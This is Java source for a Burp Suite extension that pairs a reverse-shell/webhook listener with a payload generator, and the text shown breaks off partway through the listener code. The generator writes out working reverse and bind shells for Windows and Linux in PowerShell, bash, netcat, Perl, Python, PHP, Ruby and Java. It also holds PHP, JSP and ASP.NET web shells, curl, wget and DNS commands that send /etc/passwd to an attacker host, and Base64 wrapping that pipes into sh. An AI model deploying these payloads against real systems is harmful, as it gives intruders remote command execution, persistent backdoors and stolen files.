package burp;

import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.border.TitledBorder;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableRowSorter;
import javax.swing.text.Style;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyledDocument;
import java.awt.*;
import java.awt.datatransfer.StringSelection;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Comparator;
import java.util.Enumeration;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Note: In Java, it is a convention for the public class name to match the .java file name.
 * This file is named ReverseShellReceiverPanel.java.
 */
public class ReverseShellReceiverPanel extends JPanel {

    private final IBurpExtenderCallbacks callbacks;
    private final IExtensionHelpers helpers;
    private JTextPane shellDisplayPane; // Renamed for clarity and upgraded from JTextArea
    private Style styleNormal, styleInput, styleStatus; // Styles for the JTextPane
    private JTextField portField;
    private JTextField statusField;
    private ServerSocket serverSocket;
    private Thread listenerThread;
    private volatile boolean isListening;
    private JButton startButton;
    private JButton stopButton;
    private JButton clearHistoryButton;
    private JButton killPortsButton;
    private JTable historyTable;
    private DefaultTableModel tableModel;
    private List<RequestEntry> requestHistory;
    private TableRowSorter<DefaultTableModel> tableSorter;
    private int currentPort = -1; // Track the current port used by the listener
    private JComboBox<String> modeCombo;
    private JScrollPane tableScrollPane;
    private IMessageEditor requestViewer;
    private JPanel modePanel;
    private JScrollPane shellScrollPane;
    private static final String WEBHOOK_CARD = "WEBHOOK";
    private static final String SHELL_CARD = "SHELL";
    private JPanel bottomPanel;
    private JTextField inputField;
    private JButton sendButton;
    private JLabel promptLabel; // For the dynamic shell prompt
    private Thread shellReaderThread; // For managing shell cleanup
    private Socket currentClient;
    private Socket clientSocket; // For reverse shell mode
    private PrintWriter shellOut;

    // --- Payload Generator Components ---
    private JComboBox<String> payloadCategoryCombo;
    private JComboBox<String> osCombo;
    private JComboBox<String> shellTypeCombo;
    private JComboBox<String> payloadTemplateCombo;
    private JComboBox<String> ipCombo;
    private JTextField payloadPortField;
    private JComboBox<String> encodingCombo;
    private JTextArea payloadTextArea;
    private JLabel shellTypeLabel, ipLabel, portLabel;

    public ReverseShellReceiverPanel(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.requestHistory = new ArrayList<>();
        setLayout(new BorderLayout(10, 10));
        setBorder(new EmptyBorder(10, 10, 10, 10));
        initComponents();
    }

    private void initComponents() {
        JTabbedPane tabbedPane = new JTabbedPane();

        // Listener Tab
        JPanel mainPanel = new JPanel(new BorderLayout(5, 5));
        mainPanel.setBorder(BorderFactory.createTitledBorder(
                BorderFactory.createLineBorder(Color.GRAY, 1, true),
                "Reverse Shell Receiver Listener",
                TitledBorder.CENTER,
                TitledBorder.TOP,
                new Font("Arial", Font.BOLD, 14)
        ));

        // Top panel for controls and status
        JPanel topPanel = new JPanel(new BorderLayout(5, 5));

        // Control panel for mode, port, and buttons
        JPanel controlPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 10, 5));
        controlPanel.setBorder(new EmptyBorder(5, 5, 5, 5));

        JLabel modeLabel = new JLabel("Mode:");
        modeCombo = new JComboBox<>(new String[]{"HTTP Webhook", "Reverse Shell"});
        modeCombo.setFont(new Font("Arial", Font.PLAIN, 12));

        JLabel portLabelText = new JLabel("Port:");
        portLabelText.setFont(new Font("Arial", Font.PLAIN, 12));
        portField = new JTextField("8080", 6);
        portField.setFont(new Font("Arial", Font.PLAIN, 12));
        startButton = new JButton("Start Listener");
        stopButton = new JButton("Stop Listener");
        clearHistoryButton = new JButton("Clear History");
        clearHistoryButton.setEnabled(true);
        killPortsButton = new JButton("Kill Used Ports");

        // Style buttons
        startButton.setFont(new Font("Arial", Font.BOLD, 12));
        startButton.setBackground(new Color(46, 204, 113));
        startButton.setForeground(Color.WHITE);
        startButton.setFocusPainted(false);
        stopButton.setFont(new Font("Arial", Font.BOLD, 12));
        stopButton.setBackground(new Color(231, 76, 60));
        stopButton.setForeground(Color.WHITE);
        stopButton.setFocusPainted(false);
        stopButton.setEnabled(false);
        clearHistoryButton.setFont(new Font("Arial", Font.BOLD, 12));
        clearHistoryButton.setBackground(new Color(52, 152, 219));
        clearHistoryButton.setForeground(Color.WHITE);
        clearHistoryButton.setFocusPainted(false);
        clearHistoryButton.setEnabled(false); // Disabled initially as history is empty
        killPortsButton.setFont(new Font("Arial", Font.BOLD, 12));
        killPortsButton.setBackground(new Color(255, 147, 0)); // Orange for distinction
        killPortsButton.setForeground(Color.WHITE);
        killPortsButton.setFocusPainted(false);

        startButton.addActionListener(e -> startListener());
        stopButton.addActionListener(e -> stopListener());
        clearHistoryButton.addActionListener(e -> clearHistory());
        killPortsButton.addActionListener(e -> killUsedPorts());

        controlPanel.add(modeLabel);
        controlPanel.add(modeCombo);
        controlPanel.add(portLabelText);
        controlPanel.add(portField);
        controlPanel.add(startButton);
        controlPanel.add(stopButton);
        controlPanel.add(clearHistoryButton);
        controlPanel.add(killPortsButton);

        // Status field (for copyable text)
        statusField = new JTextField("Listener not running. Note: If using a VPN, ensure the port is accessible.");
        statusField.setFont(new Font("Arial", Font.ITALIC, 12));
        statusField.setForeground(Color.GRAY);
        statusField.setEditable(false);
        statusField.setBorder(null);
        statusField.setBackground(UIManager.getColor("Panel.background"));
        statusField.setHorizontalAlignment(JTextField.CENTER);

        topPanel.add(controlPanel, BorderLayout.NORTH);
        topPanel.add(statusField, BorderLayout.CENTER);

        mainPanel.add(topPanel, BorderLayout.NORTH);

        // Center panel for history and request viewer
        JPanel centerPanel = new JPanel(new BorderLayout(5, 5));

        // History table
        String[] columns = {"#", "Method", "URL", "Time"};
        tableModel = new DefaultTableModel(columns, 0) {
            @Override
            public boolean isCellEditable(int row, int column) {
                return false; // Make table non-editable
            }
        };
        historyTable = new JTable(tableModel);
        historyTable.setFont(new Font("Arial", Font.PLAIN, 12));
        historyTable.getTableHeader().setFont(new Font("Arial", Font.BOLD, 12));
        historyTable.setRowHeight(20);
        historyTable.getColumnModel().getColumn(0).setPreferredWidth(50);  // Index
        historyTable.getColumnModel().getColumn(1).setPreferredWidth(100); // Method
        historyTable.getColumnModel().getColumn(2).setPreferredWidth(400); // URL
        historyTable.getColumnModel().getColumn(3).setPreferredWidth(150); // Time

        // Enable sorting
        tableSorter = new TableRowSorter<>(tableModel);
        historyTable.setRowSorter(tableSorter);

        // Custom comparator for Time column
        tableSorter.setComparator(3, (String t1, String t2) -> {
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            LocalDateTime time1 = LocalDateTime.parse(t1, formatter);
            LocalDateTime time2 = LocalDateTime.parse(t2, formatter);
            return time1.compareTo(time2);
        });

        // Numeric comparator for Index column
        tableSorter.setComparator(0, Comparator.comparingInt(o -> Integer.parseInt(o.toString())));

        historyTable.getSelectionModel().addListSelectionListener(e -> {
            if (!e.getValueIsAdjusting()) {
                int viewRow = historyTable.getSelectedRow();
                if (viewRow >= 0) {
                    int modelRow = historyTable.convertRowIndexToModel(viewRow);
                    if (modelRow < requestHistory.size()) {
                        shellDisplayPane.setText(helpers.bytesToString(requestHistory.get(modelRow).fullRequest));
                        shellDisplayPane.setCaretPosition(0);
                    }
                }
            }
        });

        // 1. Webhook Mode - SplitPane (Table + Editor)
        // Table scroll pane
        tableScrollPane = new JScrollPane(historyTable);
        tableScrollPane.setBorder(null); // Border handled by SplitPane or parent
        
        // Native Burp message editor
        requestViewer = callbacks.createMessageEditor(this.requestController, false);
        callbacks.customizeUiComponent(requestViewer.getComponent());

        // Split pane for table and request details
        JSplitPane splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tableScrollPane, requestViewer.getComponent());
        splitPane.setDividerLocation(180);
        splitPane.setResizeWeight(0.4);
        splitPane.setBorder(null);

        // 2. Shell Mode - Terminal view
        shellDisplayPane = new JTextPane();
        shellDisplayPane.setEditable(false);
        shellDisplayPane.setFont(new Font("Monospaced", Font.PLAIN, 12));
        shellDisplayPane.setBackground(new Color(30, 30, 30)); // Terminal-like dark color
        shellDisplayPane.setForeground(new Color(200, 200, 200));
        shellDisplayPane.setCaretColor(Color.WHITE);
        shellDisplayPane.setMargin(new Insets(5, 5, 5, 5));
        
        shellScrollPane = new JScrollPane(shellDisplayPane);
        shellScrollPane.setBorder(null);
        callbacks.customizeUiComponent(shellScrollPane);

        // Style setup (same as before)
        styleNormal = shellDisplayPane.addStyle("Normal", null);
        StyleConstants.setForeground(styleNormal, new Color(200, 200, 200));

        styleInput = shellDisplayPane.addStyle("Input", styleNormal);
        StyleConstants.setForeground(styleInput, new Color(127, 255, 212));
        StyleConstants.setBold(styleInput, true);

        styleStatus = shellDisplayPane.addStyle("Status", styleNormal);
        StyleConstants.setForeground(styleStatus, new Color(255, 215, 0));
        StyleConstants.setItalic(styleStatus, true);

        // CardLayout Panel
        modePanel = new JPanel(new CardLayout());
        modePanel.add(splitPane, WEBHOOK_CARD);
        modePanel.add(shellScrollPane, SHELL_CARD);
        callbacks.customizeUiComponent(modePanel);

        mainPanel.add(modePanel, BorderLayout.CENTER);

        // Bottom panel for shell input (hidden by default)
        bottomPanel = new JPanel(new BorderLayout());
        bottomPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
        callbacks.customizeUiComponent(bottomPanel);

        inputField = new JTextField();
        inputField.setFont(new Font("Monospaced", Font.PLAIN, 12));
        inputField.setEnabled(false);
        callbacks.customizeUiComponent(inputField);

        sendButton = new JButton("Send");
        sendButton.setEnabled(false);
        callbacks.customizeUiComponent(sendButton);

        JButton clearShellButton = new JButton("Clear Shell");
        clearShellButton.addActionListener(e -> shellDisplayPane.setText(""));
        callbacks.customizeUiComponent(clearShellButton);

        JPanel inputPanel = new JPanel(new BorderLayout(5, 5));
        promptLabel = new JLabel(" Command:");
        inputPanel.add(promptLabel, BorderLayout.WEST);
        inputPanel.add(inputField, BorderLayout.CENTER);

        JPanel actionButtonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 5, 0));
        actionButtonPanel.add(sendButton);
        actionButtonPanel.add(clearShellButton);
        inputPanel.add(actionButtonPanel, BorderLayout.EAST);

        bottomPanel.add(inputPanel, BorderLayout.CENTER);
        bottomPanel.setVisible(false);

        mainPanel.add(bottomPanel, BorderLayout.SOUTH);

        // Initial listeners setup
        if (sendButton.getActionListeners().length == 0) {
            setupCommandListeners();
        }

        tabbedPane.addTab("Listener", mainPanel);

        // Payload Generator Tab
        JPanel payloadPanel = createPayloadPanel();
        tabbedPane.addTab("Payload Generator", payloadPanel);

        add(tabbedPane, BorderLayout.CENTER);
    }

    /**
     * Creates the enhanced payload generator panel with categorized payloads,
     * OS selection, encoding options, and improved UI.
     */
    private JPanel createPayloadPanel() {
        JPanel panel = new JPanel(new BorderLayout(10, 10));
        panel.setBorder(BorderFactory.createTitledBorder(
                BorderFactory.createLineBorder(Color.GRAY, 1, true),
                "Payload Generator", TitledBorder.CENTER, TitledBorder.TOP,
                new Font("Arial", Font.BOLD, 14)
        ));

        JPanel controls = new JPanel(new GridBagLayout());
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(4, 5, 4, 5);
        gbc.anchor = GridBagConstraints.WEST;

        // --- UI Components ---
        payloadCategoryCombo = new JComboBox<>(new String[]{"Reverse/Bind Shell", "Web Shell", "Data Exfiltration"});
        osCombo = new JComboBox<>(new String[]{"Linux/macOS", "Windows"});
        shellTypeLabel = new JLabel("Shell Type:");
        shellTypeCombo = new JComboBox<>(new String[]{"Reverse", "Bind"});
        JLabel templateLabel = new JLabel("Template:");
        payloadTemplateCombo = new JComboBox<>();
        ipLabel = new JLabel("Attacker IP:");
        ipCombo = new JComboBox<>();
        portLabel = new JLabel("Port:");
        payloadPortField = new JTextField("4444", 8);
        JLabel encodingLabel = new JLabel("Encoding:");
        encodingCombo = new JComboBox<>(new String[]{"None", "Base64", "URL"});

        JButton autoFillButton = new JButton("Auto-fill from Listener");
        JButton generateButton = new JButton("Generate");
        JButton copyButton = new JButton("Copy Payload");

        // --- Populate IP ComboBox ---
        List<String> ips = getAvailableIpAddresses();
        ipCombo.setEditable(true);
        ipCombo.addItem("127.0.0.1");
        for (String ip : ips) {
            ipCombo.addItem(ip);
        }
        if (!ips.isEmpty()) {
            ipCombo.setSelectedItem(ips.get(0));
        }

        // --- Layout Controls ---
        int y = 0;
        gbc.gridx = 0; gbc.gridy = y; controls.add(new JLabel("Category:"), gbc);
        gbc.gridx = 1; gbc.gridy = y++; gbc.fill = GridBagConstraints.HORIZONTAL; controls.add(payloadCategoryCombo, gbc);

        gbc.gridx = 0; gbc.gridy = y; gbc.fill = GridBagConstraints.NONE; controls.add(new JLabel("Target OS:"), gbc);
        gbc.gridx = 1; gbc.gridy = y++; gbc.fill = GridBagConstraints.HORIZONTAL; controls.add(osCombo, gbc);

        gbc.gridx = 0; gbc.gridy = y; gbc.fill = GridBagConstraints.NONE; controls.add(shellTypeLabel, gbc);
        gbc.gridx = 1; gbc.gridy = y++; gbc.fill = GridBagConstraints.HORIZONTAL; controls.add(shellTypeCombo, gbc);

        gbc.gridx = 0; gbc.gridy = y; gbc.fill = GridBagConstraints.NONE; controls.add(templateLabel, gbc);
        gbc.gridx = 1; gbc.gridy = y++; gbc.fill = GridBagConstraints.HORIZONTAL; controls.add(payloadTemplateCombo, gbc);

        gbc.gridx = 0; gbc.gridy = y; gbc.fill = GridBagConstraints.NONE; controls.add(ipLabel, gbc);
        gbc.gridx = 1; gbc.gridy = y++; gbc.fill = GridBagConstraints.HORIZONTAL; controls.add(ipCombo, gbc);

        gbc.gridx = 0; gbc.gridy = y; gbc.fill = GridBagConstraints.NONE; controls.add(portLabel, gbc);
        gbc.gridx = 1; gbc.gridy = y++; gbc.fill = GridBagConstraints.HORIZONTAL; controls.add(payloadPortField, gbc);

        gbc.gridx = 0; gbc.gridy = y; gbc.fill = GridBagConstraints.NONE; controls.add(encodingLabel, gbc);
        gbc.gridx = 1; gbc.gridy = y++; gbc.fill = GridBagConstraints.HORIZONTAL; controls.add(encodingCombo, gbc);

        // --- Buttons Panel ---
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 5, 0));
        buttonPanel.add(autoFillButton);
        buttonPanel.add(generateButton);
        buttonPanel.add(copyButton);
        gbc.gridx = 1; gbc.gridy = y; controls.add(buttonPanel, gbc);

        panel.add(controls, BorderLayout.NORTH);

        // --- Payload Text Area ---
        payloadTextArea = new JTextArea();
        payloadTextArea.setEditable(false);
        payloadTextArea.setFont(new Font("Monospaced", Font.PLAIN, 12));
        payloadTextArea.setLineWrap(true);
        payloadTextArea.setWrapStyleWord(true);
        JScrollPane payloadScroll = new JScrollPane(payloadTextArea);
        payloadScroll.setBorder(BorderFactory.createTitledBorder(
                BorderFactory.createLineBorder(Color.GRAY, 1, true), "Generated Payload",
                TitledBorder.LEFT, TitledBorder.TOP, new Font("Arial", Font.PLAIN, 12)
        ));
        panel.add(payloadScroll, BorderLayout.CENTER);

        // --- Action Listeners ---
        ActionListener optionListener = e -> updatePayloadOptions();
        payloadCategoryCombo.addActionListener(optionListener);
        osCombo.addActionListener(optionListener);
        shellTypeCombo.addActionListener(optionListener);

        autoFillButton.addActionListener(e -> {
            if (isListening && currentPort != -1) {
                if (ipCombo.getItemCount() > 0) {
                   ipCombo.setSelectedIndex(ipCombo.getItemCount() > 1 ? 1 : 0); // Prefer first non-localhost IP
                }
                payloadPortField.setText(String.valueOf(currentPort));
            } else {
                JOptionPane.showMessageDialog(this, "Listener is not running.", "Info", JOptionPane.INFORMATION_MESSAGE);
            }
        });

        generateButton.addActionListener(e -> generatePayload());
        copyButton.addActionListener(e -> {
            String payload = payloadTextArea.getText();
            if (payload != null && !payload.isEmpty()) {
                StringSelection stringSelection = new StringSelection(payload);
                Toolkit.getDefaultToolkit().getSystemClipboard().setContents(stringSelection, null);
                JOptionPane.showMessageDialog(this, "Payload copied to clipboard!", "Success", JOptionPane.INFORMATION_MESSAGE);
            }
        });

        // Initialize options
        updatePayloadOptions();

        return panel;
    }

    /**
     * Dynamically updates the available templates and UI components based on the selected
     * payload category, OS, and shell type.
     */
    private void updatePayloadOptions() {
        String category = (String) payloadCategoryCombo.getSelectedItem();
        String os = (String) osCombo.getSelectedItem();
        String shellType = (String) shellTypeCombo.getSelectedItem();

        DefaultComboBoxModel<String> model = new DefaultComboBoxModel<>();
        boolean isShell = "Reverse/Bind Shell".equals(category);

        // Show/hide components based on category
        shellTypeLabel.setVisible(isShell);
        shellTypeCombo.setVisible(isShell);
        ipLabel.setVisible(isShell || "Data Exfiltration".equals(category) || "Reverse".equals(shellType));
        ipCombo.setVisible(isShell || "Data Exfiltration".equals(category) || "Reverse".equals(shellType));
        portLabel.setVisible(isShell || "Data Exfiltration".equals(category));
        payloadPortField.setVisible(isShell || "Data Exfiltration".equals(category));

        if (isShell) {
            if ("Windows".equals(os)) {
                model.addElement("Powershell #1");
                model.addElement("Powershell #2 (TLS)");
                model.addElement("Netcat");
                model.addElement("C#");
            } else { // Linux/macOS
                model.addElement("Python3");
                model.addElement("Bash TCP");
                model.addElement("Bash UDP");
                model.addElement("Netcat (with -e)");
                model.addElement("Netcat (mkfifo)");
                model.addElement("Perl");
                model.addElement("PHP");
                model.addElement("Ruby");
                model.addElement("Java");
            }
             ipLabel.setText("Bind".equals(shellType) ? "Target IP:" : "Attacker IP:");
        } else if ("Web Shell".equals(category)) {
            model.addElement("PHP Simple Command Shell");
            model.addElement("PHP Full-featured Shell");
            model.addElement("JSP Simple Command Shell");
            model.addElement("ASP.NET Simple Command Shell");
        } else { // Data Exfiltration
            model.addElement("Curl (File Upload)");
            model.addElement("Wget (File Upload)");
            model.addElement("DNS Exfil (nslookup)");
        }

        payloadTemplateCombo.setModel(model);
    }

    private void generatePayload() {
        String ip = (String) ipCombo.getSelectedItem();
        String portStr = payloadPortField.getText().trim();
        int port;

        try {
            port = Integer.parseInt(portStr);
            if (port < 1 || port > 65535) throw new NumberFormatException();
        } catch (NumberFormatException ex) {
            JOptionPane.showMessageDialog(this, "Invalid port number (must be 1-65535).", "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }

        if (ip == null || ip.trim().isEmpty()) {
            if (shellTypeCombo.isVisible() && "Reverse".equals(shellTypeCombo.getSelectedItem())) {
                 JOptionPane.showMessageDialog(this, "IP is required for this payload type.", "Error", JOptionPane.ERROR_MESSAGE);
                return;
            }
        }

        String rawPayload = getPayloadString();
        String encoding = (String) encodingCombo.getSelectedItem();
        String finalPayload = rawPayload;

        try {
            switch (encoding) {
                case "Base64":
                    // For shells, you often need to wrap the base64 string
                    if ("Reverse/Bind Shell".equals(payloadCategoryCombo.getSelectedItem())) {
                        finalPayload = "echo " + Base64.getEncoder().encodeToString(rawPayload.getBytes()) + " | base64 -d | sh";
                    } else {
                        finalPayload = Base64.getEncoder().encodeToString(rawPayload.getBytes());
                    }
                    break;
                case "URL":
                    finalPayload = URLEncoder.encode(rawPayload, StandardCharsets.UTF_8.toString());
                    break;
            }
        } catch (UnsupportedEncodingException e) {
            // This should not happen with UTF-8
            callbacks.printError("Error during URL encoding: " + e.getMessage());
        }

        payloadTextArea.setText(finalPayload);
        payloadTextArea.setCaretPosition(0);
    }

    private String getPayloadString() {
        String category = (String) payloadCategoryCombo.getSelectedItem();
        String template = (String) payloadTemplateCombo.getSelectedItem();
        String os = (String) osCombo.getSelectedItem();
        String shellType = (String) shellTypeCombo.getSelectedItem();
        String ip = ((String) ipCombo.getSelectedItem()).trim();
        int port = Integer.parseInt(payloadPortField.getText().trim());

        if ("Reverse/Bind Shell".equals(category)) {
             return getShellPayload(template, os, shellType, ip, port);
        } else if ("Web Shell".equals(category)) {
            return getWebShellPayload(template);
        } else if ("Data Exfiltration".equals(category)) {
            return getDataExfilPayload(template, ip, port);
        }
        return "Invalid selection.";
    }

    private String getShellPayload(String template, String os, String type, String ip, int port) {
        boolean isReverse = "Reverse".equals(type);
        if ("Windows".equals(os)) {
            switch (template) {
                case "Powershell #1":
                    return isReverse ?
                        "$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
                        : "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0'," + port + ");$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()";
                case "Powershell #2 (TLS)":
                     return isReverse ?
                        "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $tcpClient = New-Object System.Net.Sockets.TcpClient('" + ip + "', " + port + "); $sslStream = New-Object System.Net.Security.SslStream($tcpClient.GetStream(), $false, { $true }); $sslStream.AuthenticateAsClient('"+ip+"', $null, $sslProtocols, $false); $writer = New-Object System.IO.StreamWriter($sslStream); $writer.AutoFlush = $true; $reader = New-Object System.IO.StreamReader($sslStream); $buffer = New-Object byte[] 1024; while ($tcpClient.Connected) { $writer.Write('PS> '); $command = $reader.ReadLine(); if ($null -eq $command) { break } $output = try { Invoke-Expression $command 2>&1 | Out-String } catch { $_ | Out-String }; $writer.Write($output) }; $writer.Close(); $reader.Close(); $sslStream.Close(); $tcpClient.Close()"
                        : "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2( (New-Object System.Security.Cryptography.X509Certificates.X509Certificate2), 'password'); $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, " + port + "); $listener.Start(); $client = $listener.AcceptTcpClient(); $sslStream = [System.Net.Security.SslStream]::new($client.GetStream(), $false); $sslStream.AuthenticateAsServer($cert, $false, 'Tls12', $false); $reader = [System.IO.StreamReader]::new($sslStream); $writer = [System.IO.StreamWriter]::new($sslStream); $writer.AutoFlush = $true; while ($client.Connected) { $writer.Write('PS> '); $cmd = $reader.ReadLine(); if ($null -eq $cmd) { break }; $output = try { iex $cmd 2>&1 | Out-String } catch { $_ | Out-String }; $writer.Write($output) }; $writer.Close(); $reader.Close(); $sslStream.Close(); $client.Close(); $listener.Stop()";
                case "Netcat":
                    return isReverse ? "nc.exe -e cmd.exe " + ip + " " + port : "nc.exe -l -p " + port + " -e cmd.exe";
                case "C#":
                    return isReverse ?
                        "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:C:\\Users\\Public\\rev.exe C:\\Users\\Public\\rev.cs && C:\\Users\\Public\\rev.exe"
                        : "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:C:\\Users\\Public\\bind.exe C:\\Users\\Public\\bind.cs && C:\\Users\\Public\\bind.exe";
                default: return "Template not implemented.";
            }
        } else { // Linux/macOS
            switch (template) {
                case "Bash TCP":
                    return isReverse ? "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1" : "mkfifo /tmp/p; /bin/sh -i < /tmp/p 2>&1 | nc -lvp " + port + " > /tmp/p";
                case "Bash UDP":
                    return isReverse ? "sh -i >& /dev/udp/" + ip + "/" + port + " 0>&1" : "Not practical for bind shell.";
                case "Netcat (with -e)":
                    return isReverse ? "nc -e /bin/bash " + ip + " " + port : "nc -lvp " + port + " -e /bin/bash";
                case "Netcat (mkfifo)":
                    return isReverse ? "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc " + ip + " " + port + " > /tmp/f" : "nc -lvp " + port + " 0< /tmp/f | /bin/sh 1> /tmp/f";
                case "Perl":
                    return isReverse ?
                        "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
                        : "perl -e 'use Socket;$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,1);for(;accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");}'";
                case "Python3":
                    return isReverse ?
                        "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"
                        : "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\"," + port + "));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
                case "PHP":
                    return isReverse ?
                        "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                        : "php -r '$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($sock,\"0.0.0.0\"," + port + ");socket_listen($sock,1);$client=socket_accept($sock);while(1){$r=array($client);$w=NULL;$e=NULL;if(socket_select($r,$w,$e,NULL)){$input=socket_read($client,1024);$output=shell_exec($input);socket_write($client,$output);}};'";
                case "Ruby":
                    return isReverse ?
                        "ruby -rsocket -e 'f=TCPSocket.open(\"" + ip + "\"," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
                        : "ruby -rsocket -e 's=TCPServer.new("+port+");c=s.accept;while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'";
                case "Java":
                    return isReverse ? "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/" + ip + "/" + port + ";cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()" : "Template not implemented.";
                default: return "Template not implemented.";
            }
        }
    }

    private String getWebShellPayload(String template) {
        switch (template) {
            case "PHP Simple Command Shell":
                return "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>";
            case "PHP Full-featured Shell":
                return "<?php set_time_limit(0); error_reporting(0); if(get_magic_quotes_gpc()){ foreach($_POST as $key=>$value){ $_POST[$key] = stripslashes($value); } } echo '<!DOCTYPE HTML><html><head><title>Simple PHP Shell</title></head><body><form method=\"post\">_cmd: <input type=\"text\" name=\"cmd\" size=\"80\"><input type=\"submit\" value=\"Execute\"></form><hr><pre>'; if(isset($_POST['cmd'])){ system($_POST['cmd']); } echo '</pre></body></html>';?>";
            case "JSP Simple Command Shell":
                return "<%@ page import=\"java.util.*,java.io.*\"%><% if (request.getParameter(\"cmd\") != null) { Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %>";
            case "ASP.NET Simple Command Shell":
                return "<%@ Page Language=\"C#\" Debug=\"true\" Trace=\"false\" %><%@ Import Namespace=\"System.Diagnostics\" %><%@ Import Namespace=\"System.IO\" %><script Language=\"c#\" runat=\"server\">void Page_Load(object sender, EventArgs e){}</script><HTML><body ><form id=\"form1\" runat=\"server\"><input type=\"text\" name=\"cmd\" /><input type=\"submit\" value=\"Run\" /></form><% Response.Write(\"<pre>\"); if (Request.Form[\"cmd\"] != null){Process p = new Process();p.StartInfo.FileName = \"cmd.exe\";p.StartInfo.Arguments = \"/c \" + Request.Form[\"cmd\"];p.StartInfo.RedirectStandardOutput = true;p.StartInfo.UseShellExecute = false;p.Start();string output = p.StandardOutput.ReadToEnd();p.WaitForExit();Response.Write(output);}Response.Write(\"</pre></body></HTML>\");";
            default: return "Template not implemented.";
        }
    }

    private String getDataExfilPayload(String template, String ip, int port) {
        String listenerUrl = "http://" + ip + ":" + port + "/";
        switch (template) {
            case "Curl (File Upload)":
                return "curl -X POST --data-binary @/etc/passwd " + listenerUrl;
            case "Wget (File Upload)":
                 return "wget --post-file=/etc/passwd " + listenerUrl;
            case "DNS Exfil (nslookup)":
                return "nslookup $(cat /etc/passwd | tr -d '\\n' | xxd -p -c 20).your-dns-collaborator.net";
            default: return "Template not implemented.";
        }
    }
    // --- End of Payload Generator Logic ---

    private void startListener() {
        try {
            int port = Integer.parseInt(portField.getText().trim());
            if (port < 1 || port > 65535) {
